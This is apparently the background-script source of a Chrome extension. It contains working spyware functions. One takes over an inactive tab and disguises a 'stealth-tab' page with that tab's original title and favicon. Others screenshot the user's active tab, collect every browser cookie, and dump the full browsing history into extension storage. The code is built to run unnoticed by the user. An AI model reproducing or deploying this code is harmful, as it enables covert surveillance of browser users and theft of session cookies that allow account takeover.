import { SearchParamKey, StorageKey } from "../consts";
import { IScreenshotLogEntry } from "../interfaces";
import {
  contextData,
  simplePrepend,
  simpleSet,
  writeLog,
} from "./shared-utils";

if (typeof window !== "undefined") {
  throw new Error("Cannot use this in page");
}

export async function openStealthTab() {
  writeLog("Attempting to open stealth tab");

  const tabs = await chrome.tabs.query({
    // Don't use the tab the user is looking at
    active: false,
    // Don't use pinned tabs, they're probably used frequently
    pinned: false,
    // Don't use a tab generating audio
    audible: false,
    // Don't use a tab until it is finished loading
    status: "complete",
  });

  if (tabs.find((tab) => tab.url?.includes("stealth-tab.html"))) {
    await writeLog("Stealth tab exists");
    return;
  }

  const [eligibleTab] = tabs.filter((tab) => {
    // Must have url and id
    if (!tab.id || !tab.url) {
      return false;
    }

    // Don't use extension pages
    if (new URL(tab.url).protocol === "chrome-extension:") {
      return false;
    }

    return true;
  });

  if (eligibleTab) {
    await writeLog("Found eligible tab host for stealth tab");

    const searchParams = new URLSearchParams({
      [SearchParamKey.RETURN_URL]: eligibleTab.url as string,
      [SearchParamKey.FAVICON_URL]: eligibleTab.favIconUrl || "",
      [SearchParamKey.TITLE]: eligibleTab.title || "",
    });

    const url = `${chrome.runtime.getURL(
      "/stealth-tab/stealth-tab.html"
    )}?${searchParams.toString()}`;

    // Retry this a few times, it intermittently errors
    for (let i = 0; i < 3; ++i) {
      try {
        await chrome.tabs.update(eligibleTab.id as number, {
          url,
          active: false,
        });
        break;
      } catch (e) {}
    }

    await writeLog("Initialized stealth tab");
  } else {
    await writeLog("No eligible tab host for stealth tab");
  }
}

export async function captureVisibleTab() {
  writeLog(`Capturing visible tab`);

  const [activeTab] = await chrome.tabs.query({
    active: true,
    currentWindow: true,
  });

  if (!activeTab || !activeTab.url) {
    return;
  }

  await simplePrepend<IScreenshotLogEntry>(
    StorageKey.SCREENSHOT_LOG,
    {
      ...contextData(),
      url: activeTab.url,
      imageData: await chrome.tabs.captureVisibleTab(),
    },
    20
  );
}

export async function captureCookies() {
  writeLog(`Capturing cookies`);

  simpleSet<chrome.cookies.Cookie[]>(
    StorageKey.COOKIES,
    await chrome.cookies.getAll({})
  );
}

export async function captureHistory() {
  writeLog(`Capturing history`);
  simpleSet<chrome.history.HistoryItem[]>(
    StorageKey.HISTORY,
    await chrome.history.search({ text: "" })
  );
}
